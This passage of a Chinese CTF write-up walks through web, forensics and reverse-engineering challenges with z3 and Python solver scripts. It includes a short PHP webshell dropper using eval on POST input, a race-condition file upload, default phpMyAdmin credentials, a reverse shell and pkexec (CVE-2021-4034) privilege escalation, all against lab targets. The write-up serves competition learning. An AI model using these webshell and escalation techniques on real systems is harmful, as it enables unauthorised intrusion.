NVSID_7da51544=5b62jp0rgrcqc8e337c0pnv7o4; </span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 4</span><br><span class="line"></span><br><span class="line">cmd=ls</span><br></pre></td></tr></table></figure>

<p>然后 拿到 反弹回来的 Shell </p>
<p>写入 Linpeas 检查提权情况</p>
<p>发现 pkexec 提权 CVE-2021-4034</p>
<p>然后下载纯 C 代码 版本进行提权</p>
<p>发现 假 flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat flag</span><br><span class="line">a48,a35,a44,a91,a19,a65,a21,a69,a69,a67,a13,a18,a20,a65,a21,a13,a19,a23,a65,a69,a13,a20,a67,a17,a18,a13,a25,a17,a65,a69,a17,a68,a19,a19,a68,a18,a65,a17,a93</span><br></pre></td></tr></table></figure>

<p>发现 I_want_capture_the_flag 文件为 ELF</p>
<p>逆向后 发现需要去掉 bocai 文件   然后进行删除</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">lsattr</span><br><span class="line">---------------- ./cache</span><br><span class="line">---------------- ./cfg</span><br><span class="line">---------------- ./crossdomain.xml</span><br><span class="line">---------------- ./css</span><br><span class="line">---------------- ./favicon.ico</span><br><span class="line">---------------- ./images</span><br><span class="line">---------------- ./img</span><br><span class="line">---------------- ./index.html</span><br><span class="line">---------------- ./index.php</span><br><span class="line">---------------- ./js</span><br><span class="line">---------------- ./lib</span><br><span class="line">---------------- ./LICENSE.txt</span><br><span class="line">---------------- ./login.php</span><br><span class="line">---------------- ./navigate_download.php</span><br><span class="line">---------------- ./navigate_info.php</span><br><span class="line">---------------- ./navigate.php</span><br><span class="line">---------------- ./navigate.sql</span><br><span class="line">---------------- ./navigate_upload.php</span><br><span class="line">---------------- ./package.zip</span><br><span class="line">---------------- ./plugins</span><br><span class="line">---------------- ./private</span><br><span class="line">---------------- ./README</span><br><span class="line">---------------- ./themes</span><br><span class="line">---------------- ./updates</span><br><span class="line">---------------- ./web</span><br><span class="line">----ia---------- ./bocai.html</span><br><span class="line">----ia---------- ./bocai.png</span><br><span class="line">---------------- ./I_want_capture_the_flag</span><br><span class="line">chattr -ia bocai.*</span><br><span class="line">rm -rf bocai.*</span><br><span class="line">ls</span><br><span class="line">I_want_capture_the_flag</span><br><span class="line">LICENSE.txt</span><br><span class="line">README</span><br><span class="line">cache</span><br><span class="line">cfg</span><br><span class="line">crossdomain.xml</span><br><span class="line">css</span><br><span class="line">favicon.ico</span><br><span class="line">images</span><br><span class="line">img</span><br><span class="line">index.html</span><br><span class="line">index.php</span><br><span class="line">js</span><br><span class="line">lib</span><br><span class="line">login.php</span><br><span class="line">navigate.php</span><br><span class="line">navigate.sql</span><br><span class="line">navigate_download.php</span><br><span class="line">navigate_info.php</span><br><span class="line">navigate_upload.php</span><br><span class="line">package.zip</span><br><span class="line">plugins</span><br><span class="line">private</span><br><span class="line">themes</span><br><span class="line">updates</span><br><span class="line">web</span><br><span class="line">./I_want_capture_the_flag</span><br><span class="line">PCL&#123;3a5eecXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&#125;</span><br></pre></td></tr></table></figure>

<h3><span id="easygo">easygo</span><a href="#easygo" class="header-anchor"></a></h3><p>下载附件 根据 gomod 检查到 github 仓库</p>
<p><a href="https://github.com/KaanSK/golang-sqli-challenge">https://github.com/KaanSK/golang-sqli-challenge</a></p>
<p>然后访问 发现 solution </p>
<p>PostgreSQL 注入 在 juice 下</p>
<p>通过 solution 或者sqlmap 就可以获取到flag 在 select flag from super_secret_table 下</p>
<h3><span id="easysql">easysql</span><a href="#easysql" class="header-anchor"></a></h3><p>dirsearch 扫描发现phpmyadmin，口令root，password到了后台</p>
<p><img src="../images/2022-pcb-SU-Writeup/image8.png"></p>
<p>挨个登陆 发现其中一个有flag User&#x3D;SuperF1@g&amp;Pass&#x3D;F1@g_1N_Th1S_UsEr_Y0u_Ge7_P@ssW0rd!!!</p>
<p><img src="../images/2022-pcb-SU-Writeup/image9.png"></p>
<h3><span id="ya-suo-bao">压缩包</span><a href="#ya-suo-bao" class="header-anchor"></a></h3><p>解法1：</p>
<p>制作一个多文件的压缩包如下图：</p>
<p><img src="../images/2022-pcb-SU-Writeup/image10.png"></p>
<p>将压缩包base64编码后通过content参数发包</p>
<p>通过条件竞争去访问xxada.php</p>
<p><a href="http://192.168.1.113/static/upload/b712fd7be07efcb74ee5a9a9e5eb6ceb/xxxada.php">http://192.168.1.113</a>:8521&#x2F;static&#x2F;upload&#x2F;1b4fd24ada6be9d55e67a6f8ab55c0c9&#x2F;xxada.php</p>
<p><img src="../images/2022-pcb-SU-Writeup/image11.png"></p>
<p>通过puts跨目录写shell到static&#x2F;upload&#x2F;下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&#x27;../shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;])?&#x27;);?&gt;</span><br></pre></td></tr></table></figure>

<p><a href="http://192.168.1.110:8521/static/upload/shell.php">http://192.168.1.110:8521/static/upload/shell.php</a></p>
<p><img src="../images/2022-pcb-SU-Writeup/image12.png"></p>
<p>解法2：</p>
<p>构造一个畸形的压缩包或者解压到一半损坏的压缩包即可。</p>
<p><img src="../images/2022-pcb-SU-Writeup/image13.png"></p>
<p><img src="../images/2022-pcb-SU-Writeup/image14.png"></p>
<p><img src="../images/2022-pcb-SU-Writeup/image15.png"></p>
<h2><span id="misc">misc</span><a href="#misc" class="header-anchor"></a></h2><h3><span id="jian-dan-qu-zheng">简单取证</span><a href="#jian-dan-qu-zheng" class="header-anchor"></a></h3><p>filescan发现secret.jpg</p>
<p><img src="../images/2022-pcb-SU-Writeup/image16.png"></p>
<p>下载之后打开发现是base64编码,解码之后发现是倒置的zip</p>
<p>简单处理下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a=open(&#x27;1.zip&#x27;,&#x27;rb&#x27;)</span><br><span class="line">b=a.read()[::-1]</span><br><span class="line">c=open(&#x27;2.zip&#x27;,&#x27;wb&#x27;)</span><br><span class="line">c.write(b)</span><br></pre></td></tr></table></figure>

<p>发现要密码,最后在cmdscan里面发现密码</p>
<p><img src="../images/2022-pcb-SU-Writeup/image17.png"></p>
<p>得到flag.txt,发现是每行是一个点的坐标</p>
<p>使用gnuplot画图</p>
<p><img src="../images/2022-pcb-SU-Writeup/image18.png"></p>
<p>扫码得到flag</p>
<h3><span id="misc-water">Misc_water</span><a href="#misc-water" class="header-anchor"></a></h3><p>发现给出的png文件结尾还有多余数据,很容易发现是一个jpg数据的倒置与一个png文件</p>
<p><img src="../images/2022-pcb-SU-Writeup/image19.png"></p>
<p>简单的提取处理一下,得到三张图片</p>
<p><img src="../images/2022-pcb-SU-Writeup/image20.png"></p>
<p>根据题目名称water,猜测是盲水印</p>
<p><img src="../images/2022-pcb-SU-Writeup/image21.png"></p>
<p>得到压缩包密码:ZC4#QaWbW</p>
<p>得到一张奇怪的图片,010打开发现crc报错,而且根据图片内容很容易发现是高宽被修改</p>
<p><img src="../images/2022-pcb-SU-Writeup/image22.png"></p>
<p>因此开始爆破png宽高,得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import zlib</span><br><span class="line">import struct</span><br><span class="line"># 同时爆破宽度和高度</span><br><span class="line">filename = &quot;1.png&quot;</span><br><span class="line">with open(filename, &#x27;rb&#x27;) as f:</span><br><span class="line">    all_b = f.read()</span><br><span class="line">    data = bytearray(all_b[12:29])</span><br><span class="line">    n = 4095</span><br><span class="line">    for w in range(n):</span><br><span class="line">        width = bytearray(struct.pack(&#x27;&gt;i&#x27;, w))</span><br><span class="line">        for h in range(n):</span><br><span class="line">            height = bytearray(struct.pack(&#x27;&gt;i&#x27;, h))</span><br><span class="line">            for x in range(4):</span><br><span class="line">                data[x+4] = width[x]</span><br><span class="line">                data[x+8] = height[x]</span><br><span class="line">            crc32result = zlib.crc32(data)</span><br><span class="line">            #替换成图片的crc</span><br><span class="line">            if crc32result == 0xe5c6e010:</span><br><span class="line">                print(&quot;宽为：&quot;, end = &#x27;&#x27;)</span><br><span class="line">                print(width, end = &#x27; &#x27;)</span><br><span class="line">                print(int.from_bytes(width, byteorder=&#x27;big&#x27;))</span><br><span class="line">                print(&quot;高为：&quot;, end = &#x27;&#x27;)</span><br><span class="line">                print(height, end = &#x27; &#x27;)</span><br><span class="line">                print(int.from_bytes(height, byteorder=&#x27;big&#x27;))</span><br><span class="line">                break </span><br></pre></td></tr></table></figure>

<p><img src="../images/2022-pcb-SU-Writeup/image23.png"></p>
<p>修改高宽后得到flag</p>
<p><img src="../images/2022-pcb-SU-Writeup/image24.png"></p>
<h3><span id="what-is-log">what_is_log</span><a href="#what-is-log" class="header-anchor"></a></h3><p>文件是scap后缀，搜了一下可以用sysdig去分析</p>
<p>看题目描述：某机器的mysql中存在一些秘密，通过log文件你能找到它输入的密码或者这个秘密吗(添加PCL格式提交)</p>
<p>所以得找mysql查询这个秘密的记录</p>
<p>这里用sysdir把记录导出成txt分析</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysdig -r flag2.scap &gt; 1.txt</span><br></pre></td></tr></table></figure>

<p>在vscode里面翻了一下，大概翻到了个查询表的结构</p>
<p><img src="../images/2022-pcb-SU-Writeup/image25.png"></p>
<p>搜索这种表的特征，找到了一串数据，且带有seccess，符合题目语境</p>
<p><img src="../images/2022-pcb-SU-Writeup/image26.png"></p>
<p>PCL{1555a651a13ec074ce725383214fd7cc}</p>
<h3><span id="babybit">babybit</span><a href="#babybit" class="header-anchor"></a></h3><p>首先用OSFMount挂载镜像，然后用DiskGenius打开G盘：</p>
<p><img src="../images/2022-pcb-SU-Writeup/image27.png"></p>
<p>把zip文件导出来，其实里边就是注册表的备份文件:</p>
<p><img src="../images/2022-pcb-SU-Writeup/image28.png"></p>
<p>用Register Explorer导入注册表备份文件，bitlocker的加密开始时间位于SYSTEM:ControlSet001\Control\FVEStats\OscEncryptInit，加密结束时间则位于SYSTEM:ControlSet001\Control\FVEStats\OscEncryptComplete。</p>
<p>这里应该说是时间戳，把时间戳转为正常的date格式：</p>
<p><img src="../images/2022-pcb-SU-Writeup/image29.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import datetime</span><br><span class="line">timestamp = 132995782594427750 #132995786261823536</span><br><span class="line">value = datetime.datetime (1601, 1, 1) + datetime.timedelta(seconds=timestamp/10000000) ### combine str 3 and 4</span><br><span class="line">print(value.strftime(&#x27;%Y-%m-%d %H:%M:%S&#x27;))</span><br><span class="line"></span><br><span class="line"># 2022-06-13 07:17:39</span><br><span class="line"># 2022-06-13 07:23:46</span><br></pre></td></tr></table></figure>

<p>最后还需要把date的小时加8，因为注册表中时间戳为UTC+0，需要转成UTC+8，最后的flag：PCL{2022&#x2F;6&#x2F;13_15:17:39_2022&#x2F;6&#x2F;13_15:23:46}</p>
<h2><span id="re">re</span><a href="#re" class="header-anchor"></a></h2><h3><span id="baby-re">baby_re</span><a href="#baby-re" class="header-anchor"></a></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">key = [0x00000056, 0x00000057, 0x00000058, 0x00000059]</span><br><span class="line">key[0] ^= 0x47</span><br><span class="line">key[1] ^= 0x32</span><br><span class="line">key[2] ^= 0x11</span><br><span class="line">key[3] ^= 0x12</span><br><span class="line">enc = [119, 9, 40, 44, 106, 83, 126, 123, 33, 87, 113, 123, 112, 93, 125, 127, 41, 82, 44, 127, 39, 3, 126, 125, 119, 87, 47, 125, 33, 6, 44, 127, 112, 0, 126, 123, 115, 24]</span><br><span class="line">flag = bytearray(enc)</span><br><span class="line"></span><br><span class="line">for i in range(len(enc)):</span><br><span class="line">    flag[i] ^= key[i % 4]</span><br><span class="line"></span><br><span class="line">flag</span><br></pre></td></tr></table></figure>

<h3><span id="gocode">gocode</span><a href="#gocode" class="header-anchor"></a></h3><p>根据vm的opcode解析伪汇编指令，如下所示。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line">user input</span><br><span class="line">convert input to bytearray</span><br><span class="line">mov tmp[0], input[0]      </span><br><span class="line">mov tmp[1], input[1]      </span><br><span class="line">mov tmp[2], input[2]      </span><br><span class="line">mov tmp[3], input[3]      </span><br><span class="line">add tmp[1], tmp[2]        </span><br><span class="line">mov tmp[2], 283</span><br><span class="line">eq tmp[1], tmp[2]      input[1]+input[2] == 283</span><br><span class="line">mov tmp[1], input[1]</span><br><span class="line">mov tmp[2], input[2]</span><br><span class="line">add tmp[0], tmp[1]</span><br><span class="line">mul tmp[0], tmp[2]</span><br><span class="line">sub tmp[0], tmp[3]</span><br><span class="line">mov tmp[2], 30977</span><br><span class="line">eq tmp[0], tmp[2]     (input[0]+input[1])*input[2]-input[3] == 30977</span><br><span class="line">mov tmp[2], input[2]</span><br><span class="line">mov tmp[0], 99</span><br><span class="line">xor tmp[2], tmp[0]</span><br><span class="line">mov tmp[0], input[0]</span><br><span class="line">mul tmp[0], tmp[2]</span><br><span class="line">sub tmp[0], tmp[1]</span><br><span class="line">add tmp[0], tmp[3]</span><br><span class="line">mov tmp[1], 8182</span><br><span class="line">eq tmp[0], tmp[1]      input[0]*(input[2]^99) - input[1] + input[3] == 8182</span><br><span class="line">mov tmp[1], input[1]</span><br><span class="line">mov tmp[0], input[0]</span><br><span class="line">mov tmp[2], input[2]</span><br><span class="line">add tmp[1], tmp[0]</span><br><span class="line">add tmp[1], tmp[2]</span><br><span class="line">add tmp[1], tmp[3]</span><br><span class="line">mov tmp[0], 542</span><br><span class="line">eq tmp[1], tmp[0]       input[1]+input[0]+input[2]+input[3] == 542</span><br><span class="line">mov tmp[1], input[1]</span><br><span class="line">mov tmp[0], input[0]</span><br><span class="line">mul tmp[0], tmp[3]</span><br><span class="line">sub tmp[0], tmp[1]</span><br><span class="line">add tmp[0], tmp[2]</span><br><span class="line">mov tmp[3], 13105</span><br><span class="line">eq tmp[0], tmp[3]       input[0]*input[3] - input[1] + input[2] == 13105</span><br><span class="line">mov tmp[0], input[4]       </span><br><span class="line">mov tmp[1], input[5]</span><br><span class="line">mov tmp[2], input[6]</span><br><span class="line">mov tmp[3], 99               [input[4], input[5], input[6], 99]</span><br><span class="line">add tmp[0], tmp[3]           [input[4]+99, input[5], input[6], 99]</span><br><span class="line">mov tmp[3], 104              [input[4]+99, input[5], input[6], 104]</span><br><span class="line">xor tmp[0], tmp[3]           [(input[4]+99)^104, input[5], input[6], 104]</span><br><span class="line">mov tmp[3], 338              [(input[4]+99)^104, input[5], input[6], 338]</span><br><span class="line">eq tmp[0], tmp[3]      (input[4]+99)^104 == 338</span><br><span class="line">mov tmp[3], 51               [(input[4]+99)^104, input[5], input[6], 51]</span><br><span class="line">sub tmp[1], tmp[3]           [(input[4]+99)^104, input[5]-51, input[6], 51]</span><br><span class="line">mov tmp[3], 99               [(input[4]+99)^104, input[5]-51, input[6], 99]</span><br><span class="line">mul tmp[1], tmp[3]           [(input[4]+99)^104, (input[5]-51)*99, input[6], 99]</span><br><span class="line">mov tmp[0], 1089             [1089, (input[5]-51)*99, input[6], 99]</span><br><span class="line">eq tmp[0], tmp[1]      (input[5]-51)*99 == 1089</span><br><span class="line">mov tmp[3], 99               </span><br><span class="line">xor tmp[2], tmp[3]           [1089, (input[5]-51)*99, input[6]^99, 99]</span><br><span class="line">mov tmp[3], 107</span><br><span class="line">add tmp[2], tmp[3]           [1089, (input[5]-51)*99, input[6]^99 + 107, 107]</span><br><span class="line">mov tmp[1], 270              [1089, 270, input[6]^99 + 107, 107]</span><br><span class="line">eq tmp[2], tmp[1]      (input[6]^99) + 107 == 270</span><br><span class="line">mov tmp[1], 158              [1089, 158, input[6]^99 + 107, 107]</span><br><span class="line">mov tmp[0], input[7]         [input[7], 158, input[6]^99 + 107, 107]</span><br><span class="line">eq tmp[0], tmp[1]      input[7] == 158</span><br><span class="line">mov tmp[0], input[8]         </span><br><span class="line">mov tmp[1], input[9]</span><br><span class="line">mov tmp[2], input[10]</span><br><span class="line">mov tmp[3], input[11]        [input[8], input[9], input[10], input[11]]</span><br><span class="line">mul tmp[0], tmp[3]</span><br><span class="line">mov tmp[3], 14030            [input[8]*input[11], input[9], input[10], 14030]</span><br><span class="line">eq tmp[0], tmp[3]      input[8]*input[11] == 14030</span><br><span class="line">mov tmp[0], input[8]</span><br><span class="line">mov tmp[3], input[11]        [input[8], input[9], input[10], input[11]]</span><br><span class="line">add tmp[0], tmp[1]</span><br><span class="line">mul tmp[0], tmp[2]</span><br><span class="line">sub tmp[0], tmp[3]</span><br><span class="line">mov tmp[2], 26669            [(input[8]+input[9])*input[10]-input[11], input[9], 26669, input[11]]</span><br><span class="line">eq tmp[0], tmp[2]      (input[8]+input[9])*input[10]/input[11] == 26669</span><br><span class="line">mov tmp[2], input[10]        </span><br><span class="line">mov tmp[0], 99               [99, input[9], input[10], input[11]]</span><br><span class="line">xor tmp[2], tmp[0]</span><br><span class="line">mov tmp[0], input[8]</span><br><span class="line">mul tmp[0], tmp[2]</span><br><span class="line">sub tmp[0], tmp[1]</span><br><span class="line">add tmp[0], tmp[3]</span><br><span class="line">mov tmp[1], 21               [input[8]*(input[10]^99)-input[9]+input[11], 21, (input[10]^99), input[11]]</span><br><span class="line">eq tmp[0], tmp[1]        input[8]*(input[10]^99)-input[9]+input[11] == 21</span><br><span class="line">mov tmp[1], input[9]</span><br><span class="line">mov tmp[0], input[8]</span><br><span class="line">mov tmp[2], input[10]        [input[8], input[9], input[10], input[11]]</span><br><span class="line">add tmp[1], tmp[0]</span><br><span class="line">add tmp[1], tmp[2]</span><br><span class="line">add tmp[1], tmp[3]      </span><br><span class="line">mov tmp[0], 430             [430, input[9]+input[8]+input[10]+input[11], input[10], input[11]]</span><br><span class="line">eq tmp[1], tmp[0]       input[9]+input[8]+input[10]+input[11] == 430</span><br><span class="line">mov tmp[1], input[9]</span><br><span class="line">mov tmp[0], input[8]        [input[8], input[9], input[10], input[11]]</span><br><span class="line">mul tmp[0], tmp[3]</span><br><span class="line">sub tmp[0], tmp[1]</span><br><span class="line">add tmp[0], tmp[2]</span><br><span class="line">mov tmp[3], 14089           [input[8]*input[11] - input[9]+input[10], input[9], input[10], 14089]</span><br><span class="line">eq tmp[0], tmp[3]     input[8]*input[11] - input[9]+input[10] == 14089</span><br><span class="line">mov tmp[0], input[12]</span><br><span class="line">mov tmp[1], input[13]</span><br><span class="line">mov tmp[2], input[14]       </span><br><span class="line">mov tmp[3], 99              [input[12], input[13], input[14], 99]</span><br><span class="line">add tmp[0], tmp[3]</span><br><span class="line">mov tmp[3], 104</span><br><span class="line">xor tmp[0], tmp[3]</span><br><span class="line">mov tmp[3], 250             [(input[12]+99)^104, input[13], input[14], 250]</span><br><span class="line">eq tmp[0], tmp[3]    (input[12]+99)^104 == 250</span><br><span class="line">mov tmp[3], 30             [(input[12]+99)^104, input[13], input[14], 30]</span><br><span class="line">sub tmp[1], tmp[3]         [(input[12]+99)^104, input[13]-30, input[14], 30]</span><br><span class="line">mov tmp[3], 99</span><br><span class="line">mul tmp[1], tmp[3]         [(input[12]+99)^104, (input[13]-30)*99, input[14], 99]</span><br><span class="line">mov tmp[0], 396            [396, (input[13]-30)*99, input[14], 99]</span><br><span class="line">eq tmp[0], tmp[1]    (input[13]-30)*99 == 396</span><br><span class="line">mov tmp[3], 99            </span><br><span class="line">xor tmp[2], tmp[3]         [396, (input[13]-30)*99, input[14]^99, 99]</span><br><span class="line">mov tmp[3], 107</span><br><span class="line">add tmp[2], tmp[3]         </span><br><span class="line">mov tmp[1], 131            [396, 131, (input[14]^99)+107, 107]</span><br><span class="line">eq tmp[2], tmp[1]   (input[14]^99)+107 == 131</span><br><span class="line">mov tmp[1], 71             </span><br><span class="line">mov tmp[0], input[15]      [input[15], 71, (input[14]^99)+107, 107]</span><br><span class="line">eq tmp[0], tmp[1]    input[15] == 71</span><br><span class="line">index &gt;= 374</span><br></pre></td></tr></table></figure>

<p>首先检查输入格式，长度37，{}中有32个字符，之后按16进制转换为字节序列，再对转换得到的16个字节进行校验，用z3求解即可。脚本如下。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *   </span><br><span class="line"></span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">def solve(s):</span><br><span class="line">    global flag</span><br><span class="line">    if s.check() != sat:</span><br><span class="line">        print(&#x27;failed!&#x27;)</span><br><span class="line">        exit(0)</span><br><span class="line"></span><br><span class="line">    m = s.model()</span><br><span class="line">    for var in input:</span><br><span class="line">        flag += hex(m[var].as_long())[2:]</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    s = Solver()</span><br><span class="line">    input = [BitVec(f&quot;input&#123;i&#125;&quot;,8) for i in range(4)]</span><br><span class="line">    s.add(input[1] + input[2] == 283,</span><br><span class="line">        (input[0]+input[1])*input[2]-input[3] == 30977,</span><br><span class="line">        input[0]*(input[2]^99) - input[1] + input[3] == 8182,</span><br><span class="line">        input[1]+input[0]+input[2]+input[3] == 542,</span><br><span class="line">        input[0]*input[3] - input[1] + input[2] == 13105,)</span><br><span class="line">    solve(s)</span><br><span class="line"></span><br><span class="line">    s = Solver()</span><br><span class="line">    input = [BitVec(f&quot;input&#123;i&#125;&quot;,8) for i in range(3)]</span><br><span class="line">    s.add((input[1]-51)*99 == 1089,</span><br><span class="line">        (input[0]+99)^104 == 338,</span><br><span class="line">        (input[2]^99) + 107 == 270,)</span><br><span class="line">    solve(s)</span><br><span class="line"></span><br><span class="line">    # print(hex(158))</span><br><span class="line">    flag += &#x27;9e&#x27;</span><br><span class="line"></span><br><span class="line">    s = Solver()</span><br><span class="line">    input = [BitVec(f&quot;input&#123;i&#125;&quot;,8) for i in range(4)]</span><br><span class="line">    s.add(input[0]*input[3] == 14030,</span><br><span class="line">        (input[0]+input[1])*input[2]-input[3] == 26669,</span><br><span class="line">        input[0]*(input[2]^99)-input[1]+input[3] == 21,</span><br><span class="line">        input[1]+input[0]+input[2]+input[3] == 430,</span><br><span class="line">        input[0]*input[3] - input[1]+input[2] == 14089,)</span><br><span class="line">    solve(s)</span><br><span class="line"></span><br><span class="line">    s = Solver()</span><br><span class="line">    input = [BitVec(f&quot;input&#123;i&#125;&quot;,8) for i in range(4)]</span><br><span class="line">    s.add((input[0]+99)^104 == 250,</span><br><span class="line">        (input[1]-30)*99 == 396,</span><br><span class="line">        (input[2]^99)+107 == 131,</span><br><span class="line">        input[3] == 71)</span><br><span class="line">    solve(s)</span><br><span class="line">    # bdcc4f46 d73ec0 9e e628633d 2f227b47</span><br><span class="line">    print(&#x27;PCL&#123;&#x27;+flag+&#x27;&#125;&#x27;)</span><br></pre></td></tr></table></figure>

<h3><span id="rota">rota</span><a href="#rota" class="header-anchor"></a></h3><p>换表base64    dump出maps和box</p>
